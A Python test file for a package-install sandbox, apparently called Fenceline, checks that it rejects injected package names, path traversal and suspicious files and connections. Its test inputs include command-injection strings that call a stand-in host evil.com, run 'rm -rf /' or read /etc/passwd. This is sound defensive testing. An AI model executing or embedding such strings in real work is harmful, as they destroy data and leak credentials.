"""Security validation tests.

These tests verify that Fenceline's security boundaries hold:
- Package name injection prevention
- Container path traversal prevention
- URL construction safety
- Fail-closed behavior
- BLOCKED message integrity
"""

from __future__ import annotations

import ipaddress
from unittest.mock import patch, MagicMock

from fenceline.install.sandbox import (
    _safe_package_name,
    _validate_container_path,
    _host_pip_destination,
    SandboxedInstall,
)
from fenceline.install.fsdiff import (
    check_suspicious_files,
    FileEntry,
    _is_executable,
    _is_harmless_path,
)
from fenceline.install.matcher import check_connection
from fenceline.install.monitor import Connection


# --- Package name injection ---


class TestPackageNameInjection:
    """Verify that malicious package names cannot be used for injection."""

    def test_normal_names_pass(self):
        assert _safe_package_name("express") is True
        assert _safe_package_name("lodash") is True
        assert _safe_package_name("is-odd") is True

    def test_scoped_packages_pass(self):
        assert _safe_package_name("@types/node") is True
        assert _safe_package_name("@babel/core") is True

    def test_versioned_names_pass(self):
        """Names with dots (version-like) should pass."""
        assert _safe_package_name("co.js") is True
        assert _safe_package_name("vue.js") is True

    def test_semicolon_injection_blocked(self):
        assert _safe_package_name("foo';process.exit()//") is False

    def test_backtick_injection_blocked(self):
        assert _safe_package_name("foo`curl evil.com`") is False

    def test_dollar_injection_blocked(self):
        assert _safe_package_name("foo$(rm -rf /)") is False

    def test_newline_injection_blocked(self):
        assert _safe_package_name("foo\nbar") is False

    def test_pipe_injection_blocked(self):
        assert _safe_package_name("foo|cat /etc/passwd") is False

    def test_ampersand_injection_blocked(self):
        assert _safe_package_name("foo&& curl evil.com") is False

    def test_path_traversal_blocked(self):
        assert _safe_package_name("../../../etc/passwd") is False
        assert _safe_package_name("foo/../bar") is False

    def test_empty_string_blocked(self):
        assert _safe_package_name("") is False

    def test_spaces_blocked(self):
        assert _safe_package_name("foo bar") is False

    def test_quotes_blocked(self):
        assert _safe_package_name("foo'bar") is False
        assert _safe_package_name('foo"bar') is False

    def test_python_import_injection(self):
        """Python import statement injection via package name."""
        assert _safe_package_name("os; import sys") is False
        assert _safe_package_name("__import__('os')") is False


# --- Container path traversal ---


class TestContainerPathTraversal:
    """Verify that docker cp cannot be used to copy from unsafe paths."""

    def test_normal_paths_pass(self):
        assert _validate_container_path("/app/node_modules") is True
        assert _validate_container_path("/usr/local/lib/python3.12/site-packages/requests") is True

    def test_path_traversal_blocked(self):
        assert _validate_container_path("/app/../etc/passwd") is False
        assert _validate_container_path("/app/node_modules/../../etc/shadow") is False

    def test_relative_path_blocked(self):
        assert _validate_container_path("node_modules") is False
        assert _validate_container_path("./app/foo") is False

    def test_proc_blocked(self):
        assert _validate_container_path("/proc/1/environ") is False

    def test_sys_blocked(self):
        assert _validate_container_path("/sys/kernel/config") is False

    def test_dev_blocked(self):
        assert _validate_container_path("/dev/sda") is False

    def test_normal_deep_paths_pass(self):
        assert _validate_container_path("/app/node_modules/@types/node/index.d.ts") is True


# --- Filesystem diffing security ---


class TestFsDiffSecurity:
    """Verify filesystem diff catches malicious file placement."""

    def test_binary_in_etc_detected(self):
        added = [FileEntry("/etc/cron.d/backdoor", "755", 5000)]
        alerts = check_suspicious_files(added, [], "npm")
        assert len(alerts) >= 1
        assert any(a.severity == "critical" for a in alerts)

    def test_binary_in_root_home_detected(self):
        added = [FileEntry("/root/.bashrc", "644", 100)]
        alerts = check_suspicious_files(added, [], "npm")
        assert len(alerts) >= 1

    def test_executable_outside_node_modules(self):
        added = [FileEntry("/app/malware", "755", 50000)]
        alerts = check_suspicious_files(added, [], "npm")
        assert len(alerts) >= 1
        assert any("executable" in a.reason.lower() for a in alerts)

    def test_so_file_outside_expected(self):
        added = [FileEntry("/app/payload.so", "644", 10000)]
        alerts = check_suspicious_files(added, [], "npm")
        assert len(alerts) >= 1

    def test_normal_node_modules_no_alert(self):
        added = [
            FileEntry("/app/node_modules/express/index.js", "644", 1000),
            FileEntry("/app/node_modules/express/lib/router.js", "644", 2000),
            FileEntry("/app/node_modules/.bin/express", "755", 100),
        ]
        alerts = check_suspicious_files(added, [], "npm")
        assert len(alerts) == 0

    def test_permission_escalation_detected(self):
        modified = [FileEntry("/app/config.json", "755", 100)]
        alerts = check_suspicious_files([], modified, "npm")
        assert len(alerts) >= 1

    def test_tmp_is_harmless(self):
        """Build artifacts in /tmp should not trigger alerts."""
        assert _is_harmless_path("/tmp/webpack-cache-12345") is True

    def test_lockfile_is_harmless(self):
        assert _is_harmless_path("/app/package-lock.json") is True

    def test_systemd_dir_detected(self):
        added = [FileEntry("/var/spool/cron/root", "644", 50)]
        alerts = check_suspicious_files(added, [], "npm")
        assert len(alerts) >= 1


# --- Network detection security ---


class TestNetworkDetectionSecurity:
    """Verify network monitoring catches suspicious behavior."""

    def _make_deep_map(self):
        from fenceline.deepmap.models import AllowedDomain, CDNMap, DeepMap, ToolMap
        cdn = CDNMap(
            id="cloudflare", name="Cloudflare", asn="AS13335",
            ipv4_prefixes=[ipaddress.IPv4Network("104.16.0.0/16")],
            ipv6_prefixes=[ipaddress.IPv6Network("2606:4700::/32")],
        )
        tool = ToolMap(
            id="npm", description="npm",
            primary_domains=[AllowedDomain(domain="registry.npmjs.org",
                                           cdn_provider="cloudflare")],
        )
        return DeepMap(tools=[tool], cdns=[cdn])

    def test_non_standard_port_is_critical(self):
        """Any port other than 443 must be CRITICAL."""
        conn = Connection(
            pid=1, process_name="node",
            remote_ip="93.184.216.34", remote_port=8080,
            protocol="tcp", timestamp=0,
        )
        alert = check_connection(conn, self._make_deep_map(), "npm")
        assert alert is not None
        assert alert.severity == "critical"

    def test_unknown_ip_is_warning(self):
        """IP not in any CDN range should be WARNING."""
        conn = Connection(
            pid=1, process_name="node",
            remote_ip="45.33.32.1", remote_port=443,
            protocol="tcp", timestamp=0,
        )
        alert = check_connection(conn, self._make_deep_map(), "npm")
        assert alert is not None

    def test_known_cdn_ip_is_clean(self):
        """IP in expected CDN range on port 443 should be clean."""
        conn = Connection(
            pid=1, process_name="node",
            remote_ip="104.16.1.34", remote_port=443,
            protocol="tcp", timestamp=0,
        )
        alert = check_connection(conn, self._make_deep_map(), "npm")
        assert alert is None

    def test_common_exfil_ports_caught(self):
        """Common exfiltration ports must be caught."""
        for port in [80, 8080, 4444, 9090, 1337, 53]:
            conn = Connection(
                pid=1, process_name="node",
                remote_ip="10.0.0.1", remote_port=port,
                protocol="tcp", timestamp=0,
            )
            alert = check_connection(conn, self._make_deep_map(), "npm")
            assert alert is not None, f"Port {port} should trigger an alert"
            assert alert.severity == "critical"


# --- URL escaping security ---


class TestURLEscapingSecurity:
    """Verify registry URLs are safe from injection."""

    @patch("fenceline.check.registry.urllib.request.urlopen")
    def test_special_chars_escaped(self, mock_urlopen):
        from fenceline.check.registry import get_package_info
        mock_urlopen.side_effect = Exception("should not reach network")
        # This should not crash or construct a bad URL
        try:
            get_package_info("foo?bar=baz#fragment")
        except Exception:
            pass
        # Verify the URL was constructed safely
        if mock_urlopen.called:
            url = mock_urlopen.call_args[0][0].full_url
            assert "?" not in url.split("/")[-1]  # ? should be encoded

    @patch("fenceline.check.registry.urllib.request.urlopen")
    def test_scoped_package_preserved(self, mock_urlopen):
        from fenceline.check.registry import get_package_info
        mock_resp = MagicMock()
        mock_resp.read.return_value = b'{"name": "@types/node"}'
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp

        get_package_info("@types/node")
        url = mock_urlopen.call_args[0][0].full_url
        assert "@types/node" in url


# --- Fail-closed behavior ---


class TestFailClosedBehavior:
    """Verify Fenceline fails safely when components are unavailable."""

    def test_wrapper_blocks_without_docker(self):
        """The wrapper script must BLOCK, not pass through, when Docker is missing."""
        from fenceline.wrap import _WRAPPER_SCRIPT
        assert "BLOCKED" in _WRAPPER_SCRIPT
        assert "exit 1" in _WRAPPER_SCRIPT
        # Must NOT have a fallback to the real command for install
        lines = _WRAPPER_SCRIPT.split("\n")
        in_install_block = False
        for line in lines:
            if "IS_INSTALL" in line and "true" in line:
                in_install_block = True
            if in_install_block and "exec" in line and "REAL_CMD" in line:
                # This would mean install falls through to real cmd
                assert False, "Install must not fall through to real command"
            if in_install_block and "fi" in line:
                break

    @patch("fenceline.install.sandbox.subprocess.run")
    def test_sandbox_fails_on_docker_error(self, mock_run):
        """Sandbox must return error when Docker is unavailable."""
        mock_run.side_effect = FileNotFoundError("docker not found")
        from fenceline.deepmap.models import DeepMap
        sandbox = SandboxedInstall(DeepMap(tools=[], cdns=[]))
        alerts, code = sandbox.run(["npm", "install", "express"])
        assert code == 1


# --- Pip destination security ---


class TestPipDestination:
    """Verify pip artifacts go to the right place."""

    def test_host_pip_destination_returns_path(self):
        """Should return a Path object."""
        dest = _host_pip_destination()
        assert hasattr(dest, 'is_dir')

    @patch("sysconfig.get_path", return_value="/nonexistent/site-packages")
    def test_fallback_to_cwd_when_no_sitepackages(self, _mock):
        """When site-packages dir doesn't exist, fall back to cwd."""
        import os
        dest = _host_pip_destination()
        # Either returns the sysconfig path (if it exists) or cwd
        assert str(dest) in (os.getcwd(), "/nonexistent/site-packages")


# --- Map freshness ---


class TestMapCheck:
    """Verify map check command works safely."""

    def test_resolve_dns_returns_list(self):
        from fenceline.map_check import _resolve_dns
        # Should not crash, may return empty if offline
        result = _resolve_dns("localhost")
        assert isinstance(result, list)

    def test_ip_in_cdn_check(self):
        from fenceline.map_check import _ip_in_any_cdn
        from fenceline.deepmap.models import CDNMap, DeepMap
        cdn = CDNMap(
            id="test", name="Test", asn="AS1",
            ipv4_prefixes=[ipaddress.IPv4Network("10.0.0.0/8")],
            ipv6_prefixes=[],
        )
        deep_map = DeepMap(tools=[], cdns=[cdn])
        assert _ip_in_any_cdn("10.1.2.3", deep_map) is True
        assert _ip_in_any_cdn("192.168.1.1", deep_map) is False

    def test_invalid_ip_returns_false(self):
        from fenceline.map_check import _ip_in_any_cdn
        from fenceline.deepmap.models import DeepMap
        deep_map = DeepMap(tools=[], cdns=[])
        assert _ip_in_any_cdn("not-an-ip", deep_map) is False
